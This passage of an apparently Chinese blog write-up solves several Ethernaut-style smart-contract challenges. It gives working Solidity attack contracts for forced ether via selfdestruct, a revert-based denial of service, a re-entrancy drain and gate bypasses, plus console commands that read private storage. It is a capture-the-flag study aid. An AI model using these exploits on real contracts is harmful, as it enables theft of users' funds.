+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() public payable&#123;&#125;</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        selfdestruct(0xa7e1AEfffa71E4217d341C800641B055055a82Cb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x08-Vault"><a href="#0x08-Vault" class="headerlink" title="0x08 Vault"></a>0x08 Vault</h2><p>这题猜密码，由于区块链上信息是公开的，直接过去看……</p>
+<blockquote>
+<p>web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});</p>
+</blockquote>
+<p>(这个getStorageAt是要跟回调函数的，观察得到password是第1个（不是第0个）)</p>
+<p>这道题告诉我们，密钥这种东西不要明文上链，加个密什么的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.18;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool <span class="keyword">public</span> locked;</span><br><span class="line">  bytes32 <span class="keyword">private</span> password;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Vault</span><span class="params">(bytes32 _password)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="keyword">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">unlock</span><span class="params">(bytes32 _password)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-King"><a href="#0x09-King" class="headerlink" title="0x09 King"></a>0x09 King</h2><p>比较典型的DDOS了。先看一下当前最高的是多少钱。</p>
+<blockquote>
+<p>fromWei((await contract.prize()).toNumber())</p>
+</blockquote>
+<p>给比它多的钱，然后在收到转账时主动抛错。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span>.18;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address <span class="keyword">public</span> king;</span><br><span class="line">  uint <span class="keyword">public</span> prize;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">King</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor() <span class="keyword">public</span> payable&#123;</span><br><span class="line">        address param = <span class="number">0xb198e857FE03ABc756660684B0481B31c2DE276f</span>;</span><br><span class="line">        param.call.gas(<span class="number">10000000</span>).value(msg.value)(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//写不带fallback的合约，嗯。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0A-Re-entrancy"><a href="#0x0A-Re-entrancy" class="headerlink" title="0x0A Re-entrancy"></a>0x0A Re-entrancy</h2><p>典型的Reentrancy，坑死我了，谁tm知道为什么要提两次才能触发，嘤！</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) <span class="keyword">public</span> balances;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">donate</span><span class="params">(address _to)</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(address _who)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint balance)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">withdraw</span><span class="params">(uint _amount)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      bool is_success;</span><br><span class="line">      bytes memory _bytes;</span><br><span class="line">      (is_success, _bytes) = msg.sender.call.value(_amount)(<span class="string">""</span>);</span><br><span class="line">      <span class="keyword">if</span>(is_success) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    uint cnt = <span class="number">4</span>;</span><br><span class="line">    address instance_address = <span class="number">0x2381AB4B84B5ae2Bd884A85b07EEc65F313d32A0</span>;</span><br><span class="line">    Reentrance target = Reentrance(<span class="number">0x2381AB4B84B5ae2Bd884A85b07EEc65F313d32A0</span>);</span><br><span class="line"></span><br><span class="line">    constructor() <span class="keyword">public</span> payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">donate</span><span class="params">()</span> <span class="keyword">public</span> payable </span>&#123;</span><br><span class="line">        target.donate.value(msg.value)(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">hack</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">//提两次还行</span></span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">get_balance</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">my_eth_bal</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">ins_eth_bal</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function () external payable &#123;</span><br><span class="line">        <span class="comment">//控制递归次数</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            cnt--;</span><br><span class="line">            target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0B-Elevator"><a href="#0x0B-Elevator" class="headerlink" title="0x0B Elevator"></a>0x0B Elevator</h2><p>此题考点，看一下view的文档</p>
+<blockquote>
+<p>The compiler does not enforce yet that a view method is not modifying state.</p>
+</blockquote>
+<p>说得很明白了，骚一下即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Building</span> </span>&#123;</span><br><span class="line">  <span class="function">function <span class="title">isLastFloor</span><span class="params">(uint)</span> view external <span class="title">returns</span> <span class="params">(bool)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool <span class="keyword">public</span> top;</span><br><span class="line">  uint <span class="keyword">public</span> floor;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">goTo</span><span class="params">(uint _floor)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x59857e686c7f63a3C94225B2B075097Bedc1e0E8</span>;</span><br><span class="line">    Elevator target = Elevator(instance_address);</span><br><span class="line">    bool <span class="keyword">public</span> isLast = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">isLastFloor</span><span class="params">(uint)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">        isLast = ! isLast;</span><br><span class="line">        <span class="keyword">return</span> isLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">hack</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        target.goTo(<span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0C-Privacy"><a href="#0x0C-Privacy" class="headerlink" title="0x0C Privacy"></a>0x0C Privacy</h2><blockquote>
+<p>0x00000000000000000000000000000000000000000000000000000006bfff0a01<br>0x45df789a07de17f479f34ff6d72c6eee3cae57ca5096427e21bf5dca5dc7c316<br>0x1c8089d5e83cebf304d293e85d40be526505464db6a18fa6f636d811e462c9c6<br>0x63003058cd232f4440cbc189cbea2763fcc4fbdf748d996c5ecdbb7498d0b9f3<br>0x0000000000000000000000000000000000000000000000000000000000000000</p>
+</blockquote>
+<p>大端序，solidity不足32位的变量与后面的共享空间。</p>
+<p>分析一个，data[2]应该是第四个那个位置的，然后截成bytes16了（人手截）。</p>
+<blockquote>
+<p>63003058cd232f4440cbc189cbea2763</p>
+</blockquote>
+<blockquote>
+<p>contract.unlock(“0x63003058cd232f4440cbc189cbea2763”);（坑到我了）</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool <span class="keyword">public</span> locked = <span class="keyword">true</span>;</span><br><span class="line">  uint256 <span class="keyword">public</span> constant ID = block.timestamp;</span><br><span class="line">  uint8 <span class="keyword">private</span> flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 <span class="keyword">private</span> denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 <span class="keyword">private</span> awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] <span class="keyword">private</span> data;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">Privacy</span><span class="params">(bytes32[<span class="number">3</span>] _data)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">function <span class="title">unlock</span><span class="params">(bytes16 _key)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x0D-GatekeeperOne"><a href="#0x0D-GatekeeperOne" class="headerlink" title="0x0D GatekeeperOne"></a>0x0D GatekeeperOne</h2><p>gas难以把握。</p>
+<h2 id="0x0E-GatekeeperTwo"><a href="#0x0E-GatekeeperTwo" class="headerlink" title="0x0E GatekeeperTwo"></a>0x0E GatekeeperTwo</h2><p>内联汇编，看一下文档。再仔细看。</p>
+<blockquote>
+<p>extcodesize : Get size of an account’s code.<br>Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code.<br>……<br>During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while CODESIZE should return the length of the initialization code.</p>
+</blockquote>
+<p>所以我们写到构造函数里即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span>.0 &lt; <span class="number">0.6</span>.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address <span class="keyword">public</span> entrant;</span><br><span class="line"></span><br><span class="line">  <span class="function">modifier <span class="title">gateOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">modifier <span class="title">gateTwo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">modifier <span class="title">gateThree</span><span class="params">(bytes8 _gateKey)</span> </span>&#123;</span><br><span class="line">    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">enter</span><span class="params">(bytes8 _gateKey)</span> <span class="keyword">public</span> gateOne gateTwo <span class="title">gateThree</span><span class="params">(_gateKey)</span> <span class="title">returns</span> <span class="params">(bool)</span> </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x088eb6b557f4ca9a263de5897fa24d64091a1dce</span>;</span><br><span class="line">    GatekeeperTwo target = GatekeeperTwo(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">()</span></span>&#123;</span><br><span class="line">        target.enter((bytes8)(uint64(keccak256(address(<span class="keyword">this</span>))) ^ (uint64(<span class="number">0</span>) - <span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="00x0F-Naught-Coin"><a href="#00x0F-Naught-Coin" class="headerlink" title="00x0F Naught Coin"></a>00x0F Naught Coin</h2><p>看ERC20Lib中的transferFrom，子合约中并没有实现该接口，我们可以直接调用。先用approve给自己权限。3rd_contract_address是其它地址。</p>
+<blockquote>
+<p>contract.approve(player, (await contract.INITIAL_SUPPLY()).toNumber())<br>contract.transferFrom(player, 3rd_contract_address, (await contract.INITIAL_SUPPLY()).toNumber())</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"SafeMathLib.sol"</span></span><br><span class="line"></span><br><span class="line">library ERC20Lib &#123;</span><br><span class="line">  using SafeMathLib <span class="keyword">for</span> uint;</span><br><span class="line"></span><br><span class="line">  struct TokenStorage &#123;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint)) allowed;</span><br><span class="line">    uint totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">event <span class="title">Transfer</span><span class="params">(address indexed from, address indexed to, uint value)</span></span>;</span><br><span class="line">  <span class="function">event <span class="title">Approval</span><span class="params">(address indexed owner, address indexed spender, uint value)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">init</span><span class="params">(TokenStorage storage self, uint _initial_supply)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    self.totalSupply = _initial_supply;</span><br><span class="line">    self.balances[msg.sender] = _initial_supply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transfer</span><span class="params">(TokenStorage storage self, address _to, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool success)</span> </span>&#123;</span><br><span class="line">    self.balances[msg.sender] = self.balances[msg.sender].minus(_value);</span><br><span class="line">    self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">    Transfer(msg.sender, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">transferFrom</span><span class="params">(TokenStorage storage self, address _from, address _to, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool success)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _allowance = self.allowed[_from][msg.sender];</span><br><span class="line"></span><br><span class="line">    self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">    self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">    self.allowed[_from][msg.sender] = _allowance.minus(_value);</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">balanceOf</span><span class="params">(TokenStorage storage self, address _owner)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint balance)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">approve</span><span class="params">(TokenStorage storage self, address _spender, uint _value)</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bool success)</span> </span>&#123;</span><br><span class="line">    self.allowed[msg.sender][_spender] = _value;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">allowance</span><span class="params">(TokenStorage storage self, address _owner, address _spender)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint remaining)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.allowed[_owner][_spender];</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> contract StandardToken &#123;</span><br><span class="line">   using ERC20Lib <span class="keyword">for</span> ERC20Lib.TokenStorage;</span><br><span class="line"></span><br><span class="line">   ERC20Lib.TokenStorage token;</span><br><span class="line"></span><br><span class="line">   string <span class="keyword">public</span> name = <span class="string">"SimpleToken"</span>;</span><br><span class="line">   string <span class="keyword">public</span> symbol = <span class="string">"SIM"</span>;</span><br><span class="line">   uint <span class="keyword">public</span> decimals = <span class="number">18</span>;</span><br><span class="line">   uint <span class="keyword">public</span> INITIAL_SUPPLY = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">   constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">     token.init(INITIAL_SUPPLY);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">function <span class="title">totalSupply</span><span class="params">()</span> view <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(uint)</span> </span>&#123;</span><br><span class="line">     <span 